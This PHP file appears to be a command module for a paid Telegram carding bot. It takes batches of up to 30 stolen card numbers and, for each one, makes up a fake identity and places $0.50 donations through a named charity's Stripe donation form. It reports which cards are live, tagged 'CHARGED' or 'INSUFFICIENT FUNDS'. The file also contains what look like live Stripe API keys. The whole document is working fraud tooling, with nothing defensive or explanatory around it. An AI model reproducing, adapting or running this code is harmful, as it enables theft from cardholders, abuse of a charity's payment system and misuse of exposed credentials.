<?php 
if ((strpos($message, "/mtt") === 0)||(strpos($message, "!mtt") === 0)||(strpos($message, ".mtt") === 0)){
  if (($role == "OWNER") || ($role == "PREMIUM"))
  {
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}

$msg = substr($message,4);
    
//$msg = str_replace(" ", "\n", $msg);    
$listas = explode("\n",$msg);
$c = count($listas);
    $c = $c - 1;
    //sendMessage($chatId,$,$messageId);
    if($c>30)
    {
      sendMessage($chatId,"NOT MORE THAN 30 CCS AT A TIME",$messagId);
      exit();
    }
    
$msg = reply_to($chatId,urlencode("
𝗖𝗖𝗦 𝗙𝗢𝗨𝗡𝗗 $c
"),$messageId);
$respon = json_decode($msg, TRUE);
  $message_id_1 = $respon['result']['message_id'];
edit_message($chatId," Startedd....",$message_id_1);
    
    $bln = $c;
while($c>0)
{

$sk ="sk_live_Q0gQC9coYUIiUshIHCdWKBiD";

//------[Randomize Description]------//
$word = array(
1 => 'Dinner Receipt', 
2 => 'Hosting Donations',
3 => 'Accesory Receipt',                
4 => 'Clothes Receipt',                 
5 => 'Food Reciept',
); 
$rnd = array_rand($word);
$dnt = $word[$rnd];
$lista = $listas[$c];
$cc = multiexplode(array(":", "/", " ", "|"), $lista)[0];
$mes = multiexplode(array(":", "/", " ", "|"), $lista)[1];
$ano = multiexplode(array(":", "/", " ", "|"), $lista)[2];
$cvv = multiexplode(array(":", "/", " ", "|"), $lista)[3];
$lista = "$cc|$mes|$ano|$cvv";
    
if (strlen($mes) == 1) $mes = "0$mes";
if (strlen($ano) == 2) $ano = "20$ano";
$bin = substr($cc , 0 , 6);
  
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'http://bins.su/');
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_POST, 1);
    $headers = array();
    $headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
    $headers[] = 'Accept-Language: en-US,en;q=0.9';
    $headers[] = 'Cache-Control: max-age=0';
    $headers[] = 'Connection: keep-alive';
    $headers[] = 'Content-Type: application/x-www-form-urlencoded';
    $headers[] = 'Host: bins.su';
    $headers[] = 'Origin: http://bins.su';
    $headers[] = 'Referer: http://bins.su/';
    $headers[] = 'Upgrade-Insecure-Requests: 1';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=searchbins&bins='.$bin.'&bank=&country=');
$result = curl_exec($ch);
    $bincap1 = trim(strip_tags(getStr($result, '<td>Bank</td></tr><tr><td>','</td>')));
    $country = (getStr($result, '<td>'.$bincap1.'</td><td>','</td>'));
    $country2 = (getStr($result, '<td>'.$bincap1.'</td><td>','</td>'));

    
  if(empty($country))
{
  $country = "US";
  $country2 = "US";
}
if($country == "SG")
{
    $country2 = "US";
}
  //  $country = $country2;
//==================[Randomizing Details]======================//
details:
$get = file_get_contents('https://randomuser.me/api/1.2/?nat='.$country2.'');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];
if(empty($name))
{
    $name = "John";
    $last = "gips";
}
if(empty($state))
{
    $country2 = "US";
    goto details;
}
$name = trim($name);
$last = trim($last);
$mail = "$name$last"."@gmail.com";
retry:
//================= [ CURL REQUESTS ] =================//
$start = microtime(true);
#===========[1st REQ]=======#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://breatheahr.org/donate/?donation_amount=0.5');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'GET /donate/?donation_amount=0.5 h2';
$headers[] = 'Host: breatheahr.org';
$headers[] = 'cache-control: max-age=0';
$headers[] = 'upgrade-insecure-requests: 1';
$headers[] = 'user-agent: Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Mobile Safari/537.36';
$headers[] = 'accept-language: en-IN;q=0.7';
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'sec-gpc: 1';
$headers[] = 'sec-fetch-site: none';
$headers[] = 'sec-fetch-mode: navigate';
$headers[] = 'sec-fetch-user: ?1';
$headers[] = 'sec-fetch-dest: document';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$r1 = curl_exec($ch);
$vh = trim(strip_tags(getStr($r1,'{"common":{"form":{"honeypot":{"version_hash":"','"'))); 
$gkey = trim(strip_tags(getStr($r1,"input type='hidden' class='gform_hidden' name='gform_unique_id' value='","'"))); 
$hdval = trim(strip_tags(getStr($r1,"<input type='hidden' class='gform_hidden' name='state_4' value='","'")));
$nonce = trim(strip_tags(getStr($r1,'"create_payment_intent_nonce":"','"'))); 

################################
$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'authority: api.stripe.com';
$headers[] = 'method: POST';
$headers[] = 'path: /v1/payment_methods';
$headers[] = 'scheme: https';
$headers[] = 'accept: application/json';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'cache-control: no-cache';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'origin: https://js.stripe.com';
$headers[] = 'pragma: no-cache';
$headers[] = 'referer: https://js.stripe.com/';
$headers[] = 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"';
$headers[] = 'sec-ch-ua-mobile: ?0';
$headers[] = 'sec-ch-ua-platform: "Windows"';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-site';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[address][postal_code]=10080&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=NA&muid=3c24b935-ff40-4e4f-a0d4-fdf81c83f9ed0fd143&sid=f62c4621-9d87-426b-9ea8-54151e7d7dac1dadcf&payment_user_agent=stripe.js%2F5fa73ff167%3B+stripe-js-v3%2F5fa73ff167%3B+card-element&key=pk_live_51IPAYmL8zCJdqSl9yCnsp6MYVmlOu3iZph3SLwo71uUcaDsWcP9lqfv2bl5DdblyFiLEsWkzDjlbipuvPhpZ5wPj00rvwti7mm');
$r2 = curl_exec($ch);
 // sendMessage ($chatId,$r2,$messageId);
$id = trim(strip_tags(getStr($r2,'"id": "','"')));
 // sendMessage($chatId,$r2,$messageId);
if(empty($id))
{
  $msg = trim(strip_tags(getStr($r2,'"mesaage":"','"')));
  goto fuck;
}
  $l4 = trim(strip_tags(getStr($r2,'"last4": "','"')));
  $crt = trim(strip_tags(getStr($r2,'"created": "','"')));
  $brnd = trim(strip_tags(getStr($r2,'"brand": "','"')));


  #####################################
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://breatheahr.org/wp-admin/admin-ajax.php');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'POST /wp-admin/admin-ajax.php h2';
$headers[] = 'Host: breatheahr.org';
$headers[] = 'accept: application/json, text/javascript, */*; q=0.01';
$headers[] = 'x-requested-with: XMLHttpRequest';
$headers[] = 'user-agent: Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Mobile Safari/537.36';
$headers[] = 'content-type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'sec-gpc: 1';
$headers[] = 'origin: https://breatheahr.org';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'referer: https://breatheahr.org/donate/?donation_amount=0.5';
$headers[] = 'accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=gfstripe_create_payment_intent&nonce='.$nonce.'&payment_method%5Bid%5D='.$id.'&payment_method%5Bobject%5D=payment_method&payment_method%5Bbilling_details%5D%5Baddress%5D%5Bcity%5D=&payment_method%5Bbilling_details%5D%5Baddress%5D%5Bcountry%5D=&payment_method%5Bbilling_details%5D%5Baddress%5D%5Bline1%5D=&payment_method%5Bbilling_details%5D%5Baddress%5D%5Bline2%5D=&payment_method%5Bbilling_details%5D%5Baddress%5D%5Bpostal_code%5D=10080&payment_method%5Bbilling_details%5D%5Baddress%5D%5Bstate%5D=&payment_method%5Bbilling_details%5D%5Bemail%5D=&payment_method%5Bbilling_details%5D%5Bname%5D=&payment_method%5Bbilling_details%5D%5Bphone%5D=&payment_method%5Bcard%5D%5Bbrand%5D='.$brnd.'&payment_method%5Bcard%5D%5Bchecks%5D%5Baddress_line1_check%5D=&payment_method%5Bcard%5D%5Bchecks%5D%5Baddress_postal_code_check%5D=&payment_method%5Bcard%5D%5Bchecks%5D%5Bcvc_check%5D=&payment_method%5Bcard%5D%5Bcountry%5D=US&payment_method%5Bcard%5D%5Bexp_month%5D='.$mes.'&payment_method%5Bcard%5D%5Bexp_year%5D='.$ano.'&payment_method%5Bcard%5D%5Bfunding%5D=credit&payment_method%5Bcard%5D%5Bgenerated_from%5D=&payment_method%5Bcard%5D%5Blast4%5D=8939&payment_method%5Bcard%5D%5Bnetworks%5D%5Bavailable%5D%5B%5D='.$brnd.'&payment_method%5Bcard%5D%5Bnetworks%5D%5Bpreferred%5D=&payment_method%5Bcard%5D%5Bthree_d_secure_usage%5D%5Bsupported%5D=true&payment_method%5Bcard%5D%5Bwallet%5D=&payment_method%5Bcreated%5D='.$crt.'&payment_method%5Bcustomer%5D=&payment_method%5Blivemode%5D=true&payment_method%5Btype%5D=card&currency=USD&amount=50&feed_id=1');
$r3 = curl_exec($ch);
$pi = trim(strip_tags(getStr($r3,'"id":"','"')));
$scrt = trim(strip_tags(getStr($r3,'"client_secret":"','"')));
  
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://breatheahr.org/donate/?donation_amount=0.5');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'POST /donate/?donation_amount=0.5 h2';
$headers[] = 'Host: breatheahr.org';
$headers[] = 'cache-control: max-age=0';
$headers[] = 'upgrade-insecure-requests: 1';
$headers[] = 'origin: https://breatheahr.org';
$headers[] = 'content-type: multipart/form-data; boundary=----WebKitFormBoundaryJOnqfgJdjA1PT7jq';
$headers[] = 'user-agent: Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Mobile Safari/537.36';
$headers[] = 'accept-language: en-IN;q=0.7';
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'sec-gpc: 1';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'sec-fetch-mode: navigate';
$headers[] = 'sec-fetch-user: ?1';
$headers[] = 'sec-fetch-dest: document';
$headers[] = 'referer: https://breatheahr.org/donate/?donation_amount=0.5';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '------WebKitFormBoundaryJOnqfgJdjA1PT7jq
Content-Disposition: form-data; name="input_11"

Nexus
------WebKitFormBoundaryJOnqfgJdjA1PT7jq
Content-Disposition: form-data; name="input_14"

davis
------WebKitFormBoundaryJOnqfgJdjA1PT7jq
Content-Disposition: form-data; name="input_6"

'.$mail.'
------WebKitFormBoundaryJOnqfgJdjA1PT7jq
Content-Disposition: form-data; name="input_4"

10080
------WebKitFormBoundaryJOnqfgJdjA1PT7jq
Content-Disposition: form-data; name="input_9"

£ 0.50
------WebKitFormBoundaryJOnqfgJdjA1PT7jq
Content-Disposition: form-data; name="input_15"


------WebKitFormBoundaryJOnqfgJdjA1PT7jq
Content-Disposition: form-data; name="is_submit_4"

1
------WebKitFormBoundaryJOnqfgJdjA1PT7jq
Content-Disposition: form-data; name="gform_submit"

4
------WebKitFormBoundaryJOnqfgJdjA1PT7jq
Content-Disposition: form-data; name="gform_unique_id"

'.$gkey.'
------WebKitFormBoundaryJOnqfgJdjA1PT7jq
Content-Disposition: form-data; name="state_4"

'.$hdval.'
------WebKitFormBoundaryJOnqfgJdjA1PT7jq
Content-Disposition: form-data; name="gform_target_page_number_4"

0
------WebKitFormBoundaryJOnqfgJdjA1PT7jq
Content-Disposition: form-data; name="gform_source_page_number_4"

1
------WebKitFormBoundaryJOnqfgJdjA1PT7jq
Content-Disposition: form-data; name="gform_field_values"


------WebKitFormBoundaryJOnqfgJdjA1PT7jq
Content-Disposition: form-data; name="version_hash"

'.$vh.'
------WebKitFormBoundaryJOnqfgJdjA1PT7jq
Content-Disposition: form-data; name="version_hash"

'.$vh.'
------WebKitFormBoundaryJOnqfgJdjA1PT7jq
Content-Disposition: form-data; name="version_hash"

'.$vh.'
------WebKitFormBoundaryJOnqfgJdjA1PT7jq
Content-Disposition: form-data; name="stripe_response"

{"id":"'.$pi.'","client_secret":"'.$scrt.'","amount":50}
------WebKitFormBoundaryJOnqfgJdjA1PT7jq
Content-Disposition: form-data; name="stripe_credit_card_last_four"

'.$l4.'
------WebKitFormBoundaryJOnqfgJdjA1PT7jq
Content-Disposition: form-data; name="stripe_credit_card_type"

'.$brnd.'
------WebKitFormBoundaryJOnqfgJdjA1PT7jq
Content-Disposition: form-data; name="version_hash"

'.$vh.'
------WebKitFormBoundaryJOnqfgJdjA1PT7jq
Content-Disposition: form-data; name="version_hash"

'.$vh.'
------WebKitFormBoundaryJOnqfgJdjA1PT7jq
Content-Disposition: form-data; name="version_hash"

'.$vh.'
------WebKitFormBoundaryJOnqfgJdjA1PT7jq--
');
$result2 = curl_exec($ch); 
    $msg = trim(strip_tags(getStr($result2,'There was a problem with your submission:','.')));

if(isset($msg))
{
  goto fuck;
}
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents/'.$pi.'?key=pk_live_51IPAYmL8zCJdqSl9yCnsp6MYVmlOu3iZph3SLwo71uUcaDsWcP9lqfv2bl5DdblyFiLEsWkzDjlbipuvPhpZ5wPj00rvwti7mm&is_stripe_sdk=false&client_secret='.$scrt.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'GET /v1/payment_intents/'.$pi.'?key=pk_live_51IPAYmL8zCJdqSl9yCnsp6MYVmlOu3iZph3SLwo71uUcaDsWcP9lqfv2bl5DdblyFiLEsWkzDjlbipuvPhpZ5wPj00rvwti7mm&is_stripe_sdk=false&client_secret='.$scrt.' HTTP/2';
$headers[] = 'Host: api.stripe.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0';
$headers[] = 'Accept: application/json';
$headers[] = 'Accept-Language: en-US,en;q=0.5';
$headers[] = 'Referer: https://js.stripe.com/';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Origin: https://js.stripe.com';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Site: same-site';
$headers[] = 'TE: trailers';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$pin = curl_exec($ch);  
$msg2 = trim(strip_tags(getStr($pin,'"message": "','"'))); 

    if(isset($msg2))
    {
      $msg = $msg2;
    }
    if(strpos($pin,"three_d_secure_2_source"))
{
  $msg = "3D SECURE CARD";
}
if(strpos($result2, "Security code is incorrect")) 
{

$rslt = "
CHARGED : <code> $lista </code>
𝘾𝘾𝙉 𝘾𝙃𝘼𝙍𝙂𝙀𝘿 $1 @byte_coders ✅
 ";
goto hits;

}
elseif(strpos($pin, "incorrect_cvc")) 
{

$rslt = "
CHARGED : <code> $lista </code>
𝘾𝘾𝙉 𝘾𝙃𝘼𝙍𝙂𝙀𝘿 $1 @byte_coders ✅
 ";
  goto hits;
}
  elseif(strpos($pin, "succeeded")) 
{

$rslt = "
CHARGED : <code> $lista </code>
𝘾𝘾𝙉 𝘾𝙃𝘼𝙍𝙂𝙀𝘿 $1 @byte_coders ✅
 ";
  goto hits;
}
elseif(strpos($result2, "insufficient funds")) {
     $rslt = "
CVV : <code> $lista </code>
𝙄𝙉𝙎𝙐𝙁𝙁𝙄𝘾𝙄𝙀𝙉𝙏 𝙁𝙐𝙉𝘿𝙎 ✅
 ";
  goto hits;
}
  elseif(strpos($result2, "insufficient_funds")) {
 $rslt = "
CVV : <code> $lista </code>
𝙄𝙉𝙎𝙐𝙁𝙁𝙄𝘾𝙄𝙀𝙉𝙏 𝙁𝙐𝙉𝘿𝙎 ✅
 ";
    goto hits;
  }
elseif(strpos($result2, "Thank You for your donation")) {
    $rslt = "
CHARGED : <code> $lista </code>
𝘾𝘾𝙉 𝘾𝙃𝘼𝙍𝙂𝙀𝘿 $1 @byte_coders ✅
 ";
  goto hits;
}
elseif(strpos($result2, "Thank you")) {
   $rslt = "
CHARGED : <code> $lista </code>
𝘾𝘾𝙉 𝘾𝙃𝘼𝙍𝙂𝙀𝘿 $1 @byte_coders ✅
 ";
  goto hits;
}
else {
goto fuck;
}
 //sendMessage ($chatId,$msg,$messageId);
  #------------#
fuck:
    if(isset($msg2))
{
    $msg2 = "$msg";
}
    else
    {
      $msg2 = $msg;
    }
#########################[Responses Show Like]############################
$rslt = "
➜ 𝘾𝘾 : $lista 
➜ 𝙈𝙎𝙂: $msg2 $gkey $hdval $vh ❌
";
hits:
  $rslts = "$rslts $rslt";
 edit_message($chatId,urlencode("
  $rslts
  "),$message_id_1);
  $c--;

}
edit_message($chatId,urlencode("
  $rslts 
  𝙁𝙄𝙉𝙄𝙎𝙃𝙀𝘿 ✅
  "),$message_id_1);
balancechk($userId,$bln);
  }
  
  else
  {
    reply_to($chatId," 𝙉𝙊𝙏 𝙋𝙍𝙀𝙈𝙄𝙐𝙈 ❌",$messageId);
  }
}

  
?>
 